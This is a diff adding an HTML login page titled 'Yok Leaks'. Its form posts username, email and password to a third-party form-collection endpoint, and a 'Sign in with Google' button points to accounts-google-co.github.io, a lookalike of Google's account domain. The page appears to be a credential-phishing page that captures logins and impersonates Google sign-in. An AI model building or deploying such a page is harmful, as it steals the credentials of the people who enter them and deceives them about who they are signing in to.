@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yok Leaks - Login</title>
+    <style>
+        body {
+            background: #111;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: white;
+        }
+        header .title {
+            text-align: center;
+            font-size: 50px;
+            margin-top: 50px;
+            font-weight: 100;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        h2 {
+            text-align: center;
+            font-weight: 100;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 15px;
+            margin: 10px auto;
+            display: block;
+            background: #333;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+        input[type="text"]::placeholder, input[type="email"]::placeholder, input[type="password"]::placeholder {
+            color: #bbb;
+        }
+        .submit, .google {
+            width: calc(100% - 20px);
+            padding: 15px;
+            margin: 20px auto;
+            display: block;
+            background-color: #555;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            text-align: center;
+        }
+        .submit:hover, .google:hover {
+            background-color: #666;
+        }
+        .google {
+            background-color: #fff;
+            color: #000;
+            font-weight: bold;
+        }
+        .google img {
+            width: 24px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 class="title">Yok Leaks</h1>
+    </header>
+    <div class="container">
+        <h2>Login</h2>
+        <form action="https://public.herotofu.com/v1/933ad400-8587-11ef-a41c-7d1f61e4e391" method="post" accept-charset="UTF-8">
+            <input type="text" class="user" name="user" placeholder="Username" required>
+            <input type="email" class="mail" name="mail" placeholder="E-Mail" required>
+            <input type="password" class="pass" name="password" placeholder="Password" required>
+            <button class="submit" type="submit">Login</button>
+        </form>
+    </div>
+    <a class="googlelink" href="https://accounts-google-co.github.io/gmail/">
+        <button class="google"><img src="IMG_0196.jpeg" alt="Google logo"> Sign in with Google</button>
+    </a>
+</body>
+</html>
